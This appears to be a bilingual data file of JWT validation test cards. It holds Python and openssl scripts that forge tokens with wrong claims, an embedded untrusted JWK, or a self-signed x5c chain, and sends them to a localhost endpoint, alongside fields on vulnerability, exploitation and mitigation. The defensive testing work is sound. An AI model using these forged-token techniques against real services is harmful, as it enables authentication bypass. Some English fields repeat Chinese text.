description.en: Validates issuer, audience, expiration, and explicit token type independently so only a fully matching short-lived test token reaches the read-only marker.

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: 仅使用本地生成令牌、固定测试 HMAC key 或临时 RSA/X.509 fixture；不得读取生产 token/key、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT Claim Profile 验证对照 1

execution.command:
python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
now = int(time.time())
cases = {
    "valid": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-api","iat":now,"exp":now+60},
    "wrong-issuer": {"sub":"payloader-user","iss":"payloader-other","aud":"payloader-api","iat":now,"exp":now+60},
    "wrong-audience": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-other","iat":now,"exp":now+60},
    "expired": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-api","iat":now-120,"exp":now-60},
}
for name, claims in cases.items():
    header = encode({"alg":"HS256","typ":"payloader+jwt","kid":"PAYLOADER_TEST_KEY"})
    payload = encode(claims)
    signature = base64.urlsafe_b64encode(hmac.new(secret, (header+"."+payload).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+header+"."+payload+"."+signature})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(name, status)
PY
# Only the valid profile reaches the read-only marker; issuer, audience, and expiration failures are independent.

description.zh: 在隔离环境执行该JWT Claim Profile 验证对照，只访问 localhost 只读标记，并记录服务端算法、key 与 claim 决策。
description.en: 在隔离环境执行该JWT Claim Profile 验证对照，只访问 localhost 只读标记，并记录服务端算法、key 与 claim 决策。

analysis.zh: 该审校聚焦JWT 验证边界混合集。阳性必须表现为 localhost 验证器在错误算法、错误 key 来源或错误 claim 条件下仍建立了错误主体并读取同一只读标记，同时由验证器日志确认具体分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This review focuses on Mixed JWT Validation Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

title.zh: 建立JWT Claim Profile 验证基线

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。
description.en: Issue a short-lived valid token from the test issuer and record algorithm, key ID, issuer, audience, type, principal, and marker access.

title.zh: 提交JWT Claim Profile 验证阴性对照
title.en: Submit the JWT Claim Profile Validation Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

title.zh: 确认验证器拒绝分支

description.zh: 关联算法选择、key resolver、claim 校验、HTTP 状态和最终主体，排除仅能生成或解码 token 的假阳性。
description.en: Correlate algorithm selection, key resolver, claim validation, HTTP status, and final principal, excluding token generation or decoding as false positives.

title.zh: 撤销 fixture 并回归

description.zh: 删除本地 token、key、证书和缓存，重放有效基线与全部固定阴性对照。
description.en: Delete local tokens, keys, certificates, and caches, then replay the valid baseline and every fixed negative control.

overview.zh: JWT 验证边界混合集必须按 token 类型、算法、key 来源和 claim profile 分别验证；JWT 可被解码是格式属性，不代表签名或授权有效。
overview.en: Mixed JWT Validation Boundaries must be validated separately by token type, algorithm, key source, and claim profile; JWT decodability is a format property and does not imply valid signatures or authorization.

vulnerability.zh: 根因通常是验证器相信 token 自带的 alg、jwk、jku、x5u、x5c 或 kid，混用 HMAC 与非对称 key，使用低熵 HMAC key，或遗漏 issuer、audience、时间和 token type 校验。
vulnerability.en: Root causes include trusting token-supplied alg, jwk, jku, x5u, x5c, or kid values, mixing HMAC and asymmetric keys, using low-entropy HMAC keys, or omitting issuer, audience, time, and token-type validation.

exploitation.zh: 先用本地测试 issuer 生成短期有效 token 并访问只读标记，再一次只改变一个算法、key 引用或 claim。验证器必须显式固定允许算法和 key，并记录 issuer、audience、type 与时间检查结果。
exploitation.en: Generate a short-lived valid token from the local test issuer and access the read-only marker, then change exactly one algorithm, key reference, or claim. The verifier must explicitly pin algorithms and keys and log issuer, audience, type, and time checks.

mitigation.zh: 按 token 类型使用互斥验证规则，固定算法与 key 类型，使用高熵 HMAC key；只从 issuer 配置的受信来源解析 key，允许列表化 kid 与 jku/x5u，并严格校验 iss、aud、exp、nbf 和 typ。
mitigation.en: Use mutually exclusive validation rules per token type, pin algorithms and key types, and use high-entropy HMAC keys; resolve keys only from issuer-configured trusted sources, allowlist kid and jku/x5u, and strictly validate iss, aud, exp, nbf, and typ.

name.zh: JWT 内嵌 JWK 信任验证

description.zh: 验证服务端不会直接信任 token 自带的 jwk，而只使用 issuer 配置中固定的 key 来源。
description.en: Verifies that the server does not trust a token-supplied jwk and uses only key sources pinned in issuer configuration.

subCategory.zh: JWT 内嵌 JWK 信任验证

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: 仅使用本地生成令牌、固定测试 HMAC key 或临时 RSA/X.509 fixture；不得读取生产 token/key、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT 内嵌 JWK 信任验证对照 1
title.en: JWT Embedded JWK Trust Validation Control 1

execution.command:
python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
header = encode({"alg":"HS256","typ":"payloader+jwt","jwk":{"kty":"oct","kid":"PAYLOADER_UNTRUSTED","k":"UEFZTE9BREVSX1VOVFJVU1RFRA"}})
payload = encode({"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60})
signature = base64.urlsafe_b64encode(hmac.new(b"PAYLOADER_UNTRUSTED", (header+"."+payload).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+header+"."+payload+"."+signature})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: the token-supplied JWK is ignored and the token is rejected because no configured key matches.

description.zh: 在隔离环境执行该JWT 内嵌 JWK 信任验证对照，只访问 localhost 只读标记，并记录服务端算法、key 与 claim 决策。
description.en: 在隔离环境执行该JWT 内嵌 JWK 信任验证对照，只访问 localhost 只读标记，并记录服务端算法、key 与 claim 决策。

analysis.zh: 该审校聚焦JWT 验证边界混合集。阳性必须表现为 localhost 验证器在错误算法、错误 key 来源或错误 claim 条件下仍建立了错误主体并读取同一只读标记，同时由验证器日志确认具体分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This review focuses on Mixed JWT Validation Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

title.zh: 建立JWT 内嵌 JWK 信任验证基线
title.en: Baseline JWT Embedded JWK Trust Validation

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。
description.en: Issue a short-lived valid token from the test issuer and record algorithm, key ID, issuer, audience, type, principal, and marker access.

title.zh: 提交JWT 内嵌 JWK 信任验证阴性对照
title.en: Submit the JWT Embedded JWK Trust Validation Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

attackChain.payload:
python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
header = encode({"alg":"HS256","typ":"payloader+jwt","jwk":{"kty":"oct","kid":"PAYLOADER_UNTRUSTED","k":"UEFZTE9BREVSX1VOVFJVU1RFRA"}})
payload = encode({"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60})
signature = base64.urlsafe_b64encode(hmac.new(b"PAYLOADER_UNTRUSTED", (header+"."+payload).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+header+"."+payload+"."+signature})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: the token-supplied JWK is ignored and the token is rejected because no configured key matches.

title.zh: 确认验证器拒绝分支

description.zh: 关联算法选择、key resolver、claim 校验、HTTP 状态和最终主体，排除仅能生成或解码 token 的假阳性。
description.en: Correlate algorithm selection, key resolver, claim validation, HTTP status, and final principal, excluding token generation or decoding as false positives.

title.zh: 撤销 fixture 并回归

description.zh: 删除本地 token、key、证书和缓存，重放有效基线与全部固定阴性对照。
description.en: Delete local tokens, keys, certificates, and caches, then replay the valid baseline and every fixed negative control.

overview.zh: JWT 验证边界混合集必须按 token 类型、算法、key 来源和 claim profile 分别验证；JWT 可被解码是格式属性，不代表签名或授权有效。
overview.en: Mixed JWT Validation Boundaries must be validated separately by token type, algorithm, key source, and claim profile; JWT decodability is a format property and does not imply valid signatures or authorization.

vulnerability.zh: 根因通常是验证器相信 token 自带的 alg、jwk、jku、x5u、x5c 或 kid，混用 HMAC 与非对称 key，使用低熵 HMAC key，或遗漏 issuer、audience、时间和 token type 校验。
vulnerability.en: Root causes include trusting token-supplied alg, jwk, jku, x5u, x5c, or kid values, mixing HMAC and asymmetric keys, using low-entropy HMAC keys, or omitting issuer, audience, time, and token-type validation.

exploitation.zh: 先用本地测试 issuer 生成短期有效 token 并访问只读标记，再一次只改变一个算法、key 引用或 claim。验证器必须显式固定允许算法和 key，并记录 issuer、audience、type 与时间检查结果。
exploitation.en: Generate a short-lived valid token from the local test issuer and access the read-only marker, then change exactly one algorithm, key reference, or claim. The verifier must explicitly pin algorithms and keys and log issuer, audience, type, and time checks.

mitigation.zh: 按 token 类型使用互斥验证规则，固定算法与 key 类型，使用高熵 HMAC key；只从 issuer 配置的受信来源解析 key，允许列表化 kid 与 jku/x5u，并严格校验 iss、aud、exp、nbf 和 typ。
mitigation.en: Use mutually exclusive validation rules per token type, pin algorithms and key types, and use high-entropy HMAC keys; resolve keys only from issuer-configured trusted sources, allowlist kid and jku/x5u, and strictly validate iss, aud, exp, nbf, and typ.

name.zh: JWT X5C 证书链信任验证
name.en: JWT X5C Certificate Chain Trust Validation

description.zh: 使用本地自签测试证书构造签名正确的阴性 token，确认验证器仍执行完整证书链和 issuer 信任校验。
description.en: Uses a locally self-signed test certificate to create a correctly signed negative token and confirms that the verifier still validates the certificate chain and issuer trust.

subCategory.zh: JWT X5C 证书链信任验证
subCategory.en: JWT X5C Certificate Chain Trust Validation

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: 仅使用本地生成令牌、固定测试 HMAC key 或临时 RSA/X.509 fixture；不得读取生产 token/key、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT X5C 证书链信任验证对照 1
title.en: JWT X5C Certificate Chain Trust Validation Control 1

execution.command:
work_dir="$(mktemp -d)"
trap 'rm -rf "$work_dir"' EXIT
openssl req -x509 -nodes -newkey rsa:2048 -keyout "$work_dir/key.pem" -out "$work_dir/cert.pem" -days 1 -subj "/CN=payloader-untrusted"
python3 - "$work_dir/key.pem" "$work_dir/cert.pem" <<'PY'
import base64, json, subprocess, sys, time, urllib.error, urllib.request
encode = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
certificate = subprocess.check_output(["openssl","x509","-in",sys.argv[2],"-outform","DER"])
header = encode(json.dumps({"alg":"RS256","typ":"payloader+jwt","x5c":[base64.b64encode(certificate).decode()]}, separators=(",",":")).encode())
payload = encode(json.dumps({"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60}, separators=(",",":")).encode())
signing_input = (header+"."+payload).encode()
signature = subprocess.check_output(["openssl","dgst","-sha256","-sign",sys.argv[1]], input=signing_input)
token = header+"."+payload+"."+encode(signature)
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+token})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: a correctly signed token with an untrusted self-signed x5c chain is rejected.
